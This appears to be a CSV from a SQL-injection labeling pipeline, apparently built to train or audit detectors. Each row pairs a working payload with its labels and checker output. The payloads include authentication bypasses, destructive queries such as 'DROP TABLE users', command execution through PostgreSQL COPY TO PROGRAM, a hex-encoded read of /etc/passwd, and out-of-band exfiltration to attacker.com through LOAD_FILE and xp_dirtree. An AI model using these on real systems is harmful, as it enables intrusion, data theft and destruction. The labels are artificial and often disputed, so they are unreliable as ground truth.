payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",out_of_band,oracle,0.95,utl_inaddr OOB role,RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,40470,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i"
"1,2,3--",union_based,generic,0.9,UNION comment,RELABEL,reasoning too short (13 chars),union_based,generic,40471,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1,2,3--"
"NULL,NULL--",union_based,generic,0.9,UNION NULL comment,RELABEL,reasoning too short (18 chars),union_based,generic,40472,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"NULL,NULL--"
1 SELECT*/NULL--,union_based,generic,0.9,UNION comment,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,40473,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 SELECT*/NULL--
"1+ + +NULL,NULL--",union_based,generic,0.9,UNION comment,RELABEL,reasoning too short (13 chars),union_based,generic,40474,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1+ + +NULL,NULL--"
"' UNION SELECT 0x61646d696e,0x61646d696e--",union_based,generic,0.9,UNION hex,RELABEL,reasoning too short (9 chars),union_based,generic,40475,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT 0x61646d696e,0x61646d696e--"
1 AND 0x61=0x61,boolean_blind,generic,0.9,hex boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,40476,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 AND 0x61=0x61
' OR 0x313d31--,boolean_blind,generic,0.9,hex boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,40477,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,' OR 0x313d31--
CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',boolean_blind,generic,0.9,CHAR encoding,RELABEL,reasoning too short (13 chars),boolean_blind,generic,40478,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1'
"' UNION SELECT CHAR(65,68,77,73,78),NULL--",union_based,generic,0.9,CHAR union,RELABEL,reasoning too short (10 chars),union_based,generic,40479,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT CHAR(65,68,77,73,78),NULL--"
1; WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.95,WAITFOR DELAY,RELABEL,reasoning too short (13 chars),time_blind,mssql,40480,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1; WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '00:00:05'--,time_blind,mssql,0.95,WAITFOR DELAY,RELABEL,reasoning too short (13 chars),time_blind,mssql,40481,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,'; WAITFOR DELAY '00:00:05'--
"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",error_based,mssql,0.9,CONVERT error,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mssql,40482,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,stacked_queries,mssql,0.9,DECLARE exec,RELABEL,reasoning too short (12 chars),stacked_queries,mssql,40483,stacked_queries,generic,Pattern match: ';exec' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--
1;SELECT TOP 1 table_name FROM information_schema.tables--,union_based,mssql,0.9,info_schema enum,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,mysql,40484,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,1;SELECT TOP 1 table_name FROM information_schema.tables--
"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",union_based,mssql,0.9,sysobjects union,RELABEL,reasoning too short (16 chars),union_based,mssql,40485,union_based,mssql,Pattern match: 'union select' → union_based (P7); DB signature: mssql,union_based,mssql,UNION SELECT structure,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--"
' UNION SELECT NULL FROM dual--,union_based,oracle,0.95,dual union,RELABEL,reasoning too short (10 chars),union_based,oracle,40486,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,' UNION SELECT NULL FROM dual--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,out_of_band,oracle,0.95,UTL_INADDR OOB,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,40487,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--
1 AND ROWNUM=1 AND 1=1--,boolean_blind,oracle,0.9,ROWNUM boolean,RELABEL,reasoning too short (14 chars),boolean_blind,oracle,40488,boolean_blind,oracle,Pattern match: 'and 1=1' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)",1 AND ROWNUM=1 AND 1=1--
"' UNION SELECT NULL,NULL FROM dual--",union_based,oracle,0.95,dual union,RELABEL,reasoning too short (10 chars),union_based,oracle,40489,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"' UNION SELECT NULL,NULL FROM dual--"
' AND 1=(SELECT COUNT(*) FROM all_tables)--,union_based,oracle,0.95,all_tables enum,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,40490,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,' AND 1=(SELECT COUNT(*) FROM all_tables)--
'; SELECT PG_SLEEP(5)--,time_blind,postgresql,0.95,PG_SLEEP,RELABEL,reasoning too short (8 chars),time_blind,postgresql,40491,time_blind,postgresql,Pattern match: 'pg_sleep(' → time_blind (P5); DB signature: postgresql,time_blind,postgresql,time function 'sleep(' detected,'; SELECT PG_SLEEP(5)--
"' UNION SELECT NULL::text,NULL::text--",union_based,postgresql,0.9,union text,RELABEL,reasoning too short (10 chars),union_based,postgresql,40492,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT NULL::text,NULL::text--"
1;SELECT version()--,union_based,postgresql,0.9,version enum,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,40493,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1;SELECT version()--
' AND 1=(SELECT COUNT(*) FROM pg_tables)--,union_based,postgresql,0.9,pg_tables enum,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,40494,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,' AND 1=(SELECT COUNT(*) FROM pg_tables)--
'; COPY (SELECT '') TO PROGRAM 'id'--,stacked_queries,postgresql,0.95,COPY RCE,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,40495,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,'; COPY (SELECT '') TO PROGRAM 'id'--
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",error_based,mysql,0.9,EXTRACTVALUE error,RELABEL,reasoning too short (18 chars),error_based,mysql,40496,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",error_based,mysql,0.9,UPDATEXML error,RELABEL,reasoning too short (15 chars),error_based,mysql,40497,error_based,mysql,Pattern match: 'updatexml(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'updatexml(' detected,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--"
"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",error_based,mysql,0.9,floor rand error,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,40498,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",error_based,mysql,0.9,GTID_SUBSET error,RELABEL,reasoning too short (17 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,40499,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--"
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",error_based,mysql,0.9,JSON_KEYS error,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,40500,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--"
1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,error_based,mysql,0.9,POLYGON geometry,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,40501,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--
' AND EXP(~(SELECT * FROM (SELECT user())x))--,error_based,mysql,0.9,EXP error,RELABEL,reasoning too short (9 chars),error_based,mysql,40502,error_based,generic,Pattern match: 'exp(~' → error_based (P4); DB signature: generic,error_based,generic,error function 'exp(~' detected,' AND EXP(~(SELECT * FROM (SELECT user())x))--
' AND SLEEP(5) AND '1'='1,time_blind,mysql,0.95,SLEEP time,RELABEL,reasoning too short (10 chars),time_blind,mysql,40503,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected,' AND SLEEP(5) AND '1'='1
1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,time_blind,mysql,0.95,SELECT SLEEP,RELABEL,reasoning too short (12 chars),time_blind,mysql,40504,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
"' AND IF(1=1,SLEEP(5),0)--",time_blind,mysql,0.95,IF SLEEP,RELABEL,reasoning too short (8 chars),time_blind,mysql,40505,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected,"' AND IF(1=1,SLEEP(5),0)--"
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.95,IF WAITFOR,RELABEL,reasoning too short (10 chars),time_blind,mssql,40506,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,time_blind,mysql,0.95,SELECT SLEEP,RELABEL,reasoning too short (12 chars),time_blind,mysql,40507,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--
"' AND SUBSTRING(username,1,1)='a' AND '1'='1",boolean_blind,generic,0.9,SUBSTRING boolean,RELABEL,reasoning too short (17 chars),boolean_blind,generic,40508,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"' AND SUBSTRING(username,1,1)='a' AND '1'='1"
"' AND ASCII(SUBSTR(username,1,1))>64--",boolean_blind,generic,0.9,ASCII boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,40509,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"' AND ASCII(SUBSTR(username,1,1))>64--"
1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,boolean_blind,generic,0.9,COUNT boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,40510,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--
"' AND MID(version(),1,1)='5'--",boolean_blind,generic,0.9,MID boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,40511,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"' AND MID(version(),1,1)='5'--"
"' AND BINARY SUBSTRING(password,1,1)='a'--",boolean_blind,generic,0.9,BINARY boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,40512,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"' AND BINARY SUBSTRING(password,1,1)='a'--"
' OR 1=1--,auth_bypass,generic,0.95,OR 1=1,RELABEL,reasoning too short (6 chars),auth_bypass,generic,40513,boolean_blind,generic,Pattern match: 'or 1=1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",' OR 1=1--
' OR 1 = 1--,auth_bypass,generic,0.95,OR 1 = 1,RELABEL,reasoning too short (8 chars),auth_bypass,generic,40514,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",' OR 1 = 1--
'; DROP TABLE users; --,stacked_queries,generic,0.95,DROP TABLE,RELABEL,reasoning too short (10 chars),stacked_queries,generic,40515,stacked_queries,generic,Pattern match: '; drop' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,'; DROP TABLE users; --
"'; INSERT INTO users VALUES('hacker','pw')--",stacked_queries,generic,0.95,INSERT values,RELABEL,reasoning too short (13 chars),stacked_queries,generic,40516,stacked_queries,generic,Pattern match: '; insert' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,"'; INSERT INTO users VALUES('hacker','pw')--"
1'; UPDATE users SET password='hacked' WHERE '1'='1,stacked_queries,generic,0.95,UPDATE values,RELABEL,reasoning too short (13 chars),stacked_queries,generic,40517,stacked_queries,generic,Pattern match: '; update' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,1'; UPDATE users SET password='hacked' WHERE '1'='1
'; EXEC('SELECT 1')--,stacked_queries,generic,0.95,EXEC select,RELABEL,reasoning too short (11 chars),stacked_queries,generic,40518,stacked_queries,generic,Pattern match: '; exec' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,'; EXEC('SELECT 1')--
1; SELECT * FROM users--,stacked_queries,generic,0.95,SELECT users,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,40519,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1; SELECT * FROM users--
"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",out_of_band,mysql,0.95,LOAD_FILE OOB,RELABEL,reasoning too short (13 chars),out_of_band,mysql,40520,out_of_band,generic,Pattern match: 'load_file(' → out_of_band (P6); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--"
'; EXEC master..xp_dirtree '//attacker.com/a'--,out_of_band,mssql,0.95,xp_dirtree OOB,RELABEL,reasoning too short (14 chars),out_of_band,mssql,40521,out_of_band,generic,Pattern match: 'xp_dirtree' → out_of_band (P6); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec,'; EXEC master..xp_dirtree '//attacker.com/a'--
"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",out_of_band,mysql,0.95,LOAD_FILE OOB,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,generic,40522,boolean_blind,generic,Pattern match: 'and 1=2' → boolean_blind (P3); DB signature: generic,heavy_query,generic,contains 7+ digit number (DoS-style payload),"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--"
' UNION SELECT NULL--,union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,40523,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,' UNION SELECT NULL--
"' UNION SELECT NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,40524,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT NULL,NULL--"
"' UNION SELECT NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,40525,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT NULL,NULL,NULL--"
"' UNION SELECT NULL,NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,40526,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT NULL,NULL,NULL,NULL--"
"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,40527,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
"' UNION ALL SELECT NULL,NULL--",union_based,generic,0.9,UNION ALL NULL,RELABEL,reasoning too short (14 chars),union_based,generic,40528,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"' UNION ALL SELECT NULL,NULL--"
"1 UNION SELECT @@version,NULL--",union_based,generic,0.9,UNION version,RELABEL,reasoning too short (13 chars),union_based,generic,40529,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 UNION SELECT @@version,NULL--"
"1 UNION SELECT user(),database()--",union_based,generic,0.9,UNION user db,RELABEL,reasoning too short (13 chars),union_based,generic,40530,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 UNION SELECT user(),database()--"
"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",union_based,generic,0.9,UNION table enum,RELABEL,reasoning too short (16 chars),union_based,generic,40531,union_based,mysql,Pattern match: 'union select' → union_based (P7); DB signature: mysql,union_based,mysql,UNION SELECT structure,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--"
"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",union_based,generic,0.9,UNION column enum,RELABEL,reasoning too short (17 chars),union_based,generic,40532,union_based,mysql,Pattern match: 'union select' → union_based (P7); DB signature: mysql,union_based,mysql,UNION SELECT structure,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,boolean_blind,generic,0.9,LENGTH boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,40533,boolean_blind,generic,generic SQL keywords without specific signal,auth_bypass,generic,admin' prefix near boolean/comment context,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1
"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",boolean_blind,generic,0.9,SUBSTR boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,40534,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a"
1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,boolean_blind,generic,0.9,COUNT boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,40535,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0
"' AND ORD(MID(password,1,1))>64 AND '1'='1",boolean_blind,generic,0.9,ORD boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,40536,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"' AND ORD(MID(password,1,1))>64 AND '1'='1"
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",boolean_blind,generic,0.9,floor boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,40537,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1"
' '1'='1,auth_bypass,generic,0.95,quote bypass,RELABEL,reasoning too short (12 chars),auth_bypass,generic,40538,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,' '1'='1
"1 UN ION SEL ECT NULL,NULL--",auth_bypass,generic,0.9,filter bypass,RELABEL,reasoning too short (13 chars),auth_bypass,generic,40539,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1 UN ION SEL ECT NULL,NULL--"
"1 NULL,NULL--",auth_bypass,generic,0.9,NULL bypass,RELABEL,reasoning too short (11 chars),auth_bypass,generic,40540,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1 NULL,NULL--"
"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",error_based,generic,0.9,floor version error,RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,40541,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",error_based,generic,0.9,EXTRACTVALUE error,RELABEL,reasoning too short (18 chars),error_based,generic,40542,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--"
"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",error_based,generic,0.9,NAME_CONST error,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,40543,boolean_blind,generic,Pattern match: 'and 1=1' → boolean_blind (P3); DB signature: generic,union_based,generic,UNION SELECT structure,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--"
"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",error_based,generic,0.9,PROCEDURE error,RELABEL,reasoning too short (15 chars),error_based,generic,40544,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected,"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--"
